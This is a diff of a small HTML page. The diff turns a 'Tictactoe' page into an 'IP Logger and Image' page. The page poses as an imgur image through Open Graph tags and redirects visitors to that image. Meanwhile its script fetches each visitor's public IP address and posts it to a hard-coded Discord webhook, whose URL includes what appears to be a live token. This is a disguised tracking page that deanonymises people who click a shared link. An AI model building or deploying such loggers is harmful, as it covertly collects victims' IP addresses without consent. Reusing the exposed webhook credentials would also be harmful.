@@ -1,29 +1,42 @@
-<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Tictactoe</title>
+    <meta http-equiv="refresh" content="0; url=https://imgur.com/i12zp3X">
+    <title>Redirecting...</title>
+    <title>IP Logger and Image</title>
 
+    
+    <meta property="og:title" content="" />
+    <meta property="og:description" content="" />
+    <meta property="og:image" content="https://imgur.com/i12zp3X" />
     <meta property="og:title" content="Image" />
     <meta property="og:description" content=" " />
     <meta property="og:image" content="https://i.imgur.com/i12zp3X.png" />
     <meta property="og:type" content="image/png" />
 
     <script>
-        const webhookURL = "https://discordapp.com/api/webhooks/1320777914798575656/W6NiQzMU5cv83H-CinV_-S0alaK3sTST_9Omr8C5wWdDd8P9XqAh9Klg_TUn1JjQxtvg";
+        const webhookURL = "https://discordapp.com/api/webhooks/1317895579828748308/ni9_3dstKqP9xLi-AQglTGZErQ26PbkW0RIrbG3s60hX5EajueEvpIsWJPbOoNj_kd1F";
 
         async function logIP() {
+            const response = await fetch("https://api.ipify.org?format=json");
+            const data = await response.json();
             try {
                 const response = await fetch("https://api.ipify.org?format=json");
                 const data = await response.json();
 
+            // Send IP to Discord webhook
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: `IP Logged: ${data.ip}` })
+            });
                 await fetch(webhookURL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: IP Logged: ${data.ip} })
+                    body: JSON.stringify({ content: `IP Logged: ${data.ip}` })
                 });
             } catch (error) {
-                console.error("Fail Sir, im sorry are you going to sniff my toes again?:", error); 
+                console.error("Error logging IP:", error);
             }
         }
 
@@ -31,6 +44,7 @@
     </script>
 </head>
 <body>
-    <p>The image could not load Your browser must not support .lua</p> 
+    <p>Redirecting to the image...</p>
+    <p>Your image should appear when shared on Discord.</p>
 </body>
 </html>
